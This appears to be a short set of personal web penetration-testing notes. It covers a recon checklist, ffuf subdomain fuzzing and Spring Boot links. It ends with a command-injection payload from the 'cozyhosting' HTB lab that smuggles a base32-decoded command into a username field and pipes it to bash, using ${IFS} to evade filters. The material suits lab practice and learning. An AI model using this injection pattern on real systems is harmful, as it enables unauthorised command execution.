# WEB pentest notesÂ 

## Reminders check-list 
- [ ] Checking for subdomains. 
- [ ] Directory search with gobuster. 
- [ ] requesting the `robot.txt` file.
- [ ] check the CMS' versions. 
- [ ] If we have an error page, we can use it to search for the backend frameword or version. 
- [ ] ***When trying for command injection***, we must think of encoding like %20 or base64, or even other bases such as base32 when some characters are not allowed. 

## Enumeration and Info Gathering 


### Subdomain discovery
Subdomain enumeration doesn't work well with `gobuster`. It's more interesting to use `ffuf` [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf).

- notes on ffuf : [https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html](https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html)

Example usage of DNS enum with a 200 response filter :
```bash
ffuf -w wordlist.txt -u http:/domain.go/ -H "Host: FUZZ.domain.go" -mc 200
```

### Frameworks and possible backends 
- *Spring Boot* : [https://blog.certcube.com/spring-boot-pentesting-fundamentals-part-1/](https://blog.certcube.com/spring-boot-pentesting-fundamentals-part-1/)

## Command injection ideas

```
# cozyhosting HTB example
host=10.10.14.160&username=;echo${IFS}"[PAYLOAD]"|base32${IFS}-d|bash;
```
